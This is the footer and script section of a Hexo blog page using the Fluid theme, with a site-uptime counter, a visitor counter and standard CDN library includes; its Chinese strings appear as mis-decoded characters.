  <!-- ÁΩëÁ´ôËøêË°åÊó∂Èó¥ÁöÑËÆæÁΩÆ -->
  <span id="timeDate">ËΩΩÂÖ•Â§©Êï∞...</span>
  <span id="times">ËΩΩÂÖ•Êó∂ÂàÜÁßí...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//Ê≠§Â§Ñ‰øÆÊîπ‰Ω†ÁöÑÂª∫Á´ôÊó∂Èó¥ÊàñËÄÖÁΩëÁ´ô‰∏äÁ∫øÊó∂Èó¥
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3ÁöÑÂ∞èÂ±ãÂ∑≤ÁªèÂÆâÂÖ®Â≠òÂú®‰∫Ü "+dnum+" Â§© ";
          document.getElementById("times").innerHTML = hnum + " Â∞èÊó∂ " + mnum + " ÂàÜ " + snum + " Áßí";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        ÊÄªËÆøÈóÆÈáè 
        <span id="busuanzi_value_site_pv"></span>
         Ê¨°
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        ÊÄªËÆøÂÆ¢Êï∞ 
        <span id="busuanzi_value_site_uv"></span>
         ‰∫∫
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°πÔºåÂ∞ÜÂÆÉ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">ÂçöÂÆ¢Âú®ÂÖÅËÆ∏ JavaScript ËøêË°åÁöÑÁéØÂ¢É‰∏ãÊµèËßàÊïàÊûúÊõ¥‰Ω≥</div>
  </noscript>
</body>
</html>
